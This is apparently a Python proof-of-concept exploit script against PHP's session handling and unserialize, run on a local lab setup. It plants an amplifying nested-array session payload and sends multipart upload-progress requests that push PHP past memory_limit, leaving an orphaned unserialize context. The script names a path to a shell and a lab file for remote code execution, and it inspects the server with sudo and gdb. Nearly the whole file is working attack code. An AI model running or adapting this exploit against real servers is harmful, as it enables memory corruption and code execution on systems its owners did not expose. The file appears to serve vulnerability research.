#!/usr/bin/env python3
"""lv1.py - try to leave BG(unserialize).level = 1 (orphan decode context).

The arm always OOMs at the session read because the serialized text and the
decoded tree cost about the same. The request *after* the arm reads a session
file we control, so it can be a payload whose decode is ~7x its text length
(nested arrays). With a modest body pressure the read fits and the decode
crosses memory_limit, and php_var_unserialize_destroy never runs.

Usage: python3 lv1.py --nested 20000 --parts 500
"""
import argparse
import os
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import poc_unserialize as P

URL = "http://127.0.0.1:18120/index.php"
BND = b"UctxPoc2026"
MAL = "/ndary=UctxPoc2026"
SESS = "/tmp/php2shell_ap/sess"
LAB = "/tmp/php2shell_ap"


def amplify(n):
    parts = []
    for i in range(n):
        partsmp = "i:%d;a:2:{i:0;i:0;i:1;i:0;}" % i
        parts.append(partsmp)
    return (b"k|" + ("a:%d:{%s}" % (n, "".join(parts))).encode())


def pressure(sid, parts, size=4000):
    out = bytearray()
    out += P.mp_part(BND, b"PHPSESSID", sid.encode())
    out += P.mp_part(BND, b"PHP_SESSION_UPLOAD_PROGRESS", b"x")
    for _ in range(parts):
        out += P.mp_part(BND, b"fill[]", b"P" * size)
    out += b"--" + BND + b"--\r\n"
    return bytes(out)


def levels(parent):
    child = subprocess.run(["pgrep", "-P", str(parent)], capture_output=True, text=True).stdout.split()
    if not child:
        return None, None, "no child"
    out = subprocess.run(["sudo", "gdb", "-q", "-p", child[0], "-batch", "-x", "/tmp/bgchk.gdb"],
                         capture_output=True, text=True).stdout
    ser = unser = "?"
    for line in out.splitlines():
        if "SER_LEVEL=" in line:
            ser = line.split("SER_LEVEL=")[1].split()[0]
            unser = line.split("UNSER_LEVEL=")[1].split()[0]
    return ser, unser, ""


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--nested", type=int, default=20000)
    ap.add_argument("--parts", type=int, default=500)
    a = ap.parse_args()

    out = subprocess.run(["sudo", "bash", LAB + "/rce_lab.sh"], capture_output=True, text=True).stdout
    parent = int(out.split("parent=")[1].split()[0])
    subprocess.run(["sudo", "rm", "-rf", MAL + "/sess_x"])
    sid = "amp%d-abcdef" % a.nested

    st, _d, _t = P.send(URL, P.arm_body(sid, BND, 20, 65536), BND, sid, 0, 0)
    tree = subprocess.run(["sudo", "cat", "%s/sess_%s" % (SESS, sid)], capture_output=True).stdout
    payload = amplify(a.nested)
    open("/tmp/amp_payload", "wb").write(payload)
    subprocess.run(["sudo", "cp", "/tmp/amp_payload", "%s/sess_%s" % (MAL, sid)], check=False)
    subprocess.run(["sudo", "chmod", "666", "%s/sess_%s" % (MAL, sid)], check=False)
    # -

    before = len(open(LAB + "/error.log", errors="replace").read())
    st2, _d2, _t2 = P.send(URL, pressure(sid, a.parts), BND, sid, 0, 0)
    log = open(LAB + "/error.log", errors="replace").read()[before:]
    alloc = [x for x in __import__("re").findall(r"tried to allocate (\d+)", log)]
    ser, unser, why = levels(parent)
    print("arm=%s tree=%d payload=%d amp=%s alloc=%s SER=%s UNSER=%s %s"
          % (st, len(tree), len(payload), st2, alloc[:2], ser, unser, why))


if __name__ == "__main__":
    main()
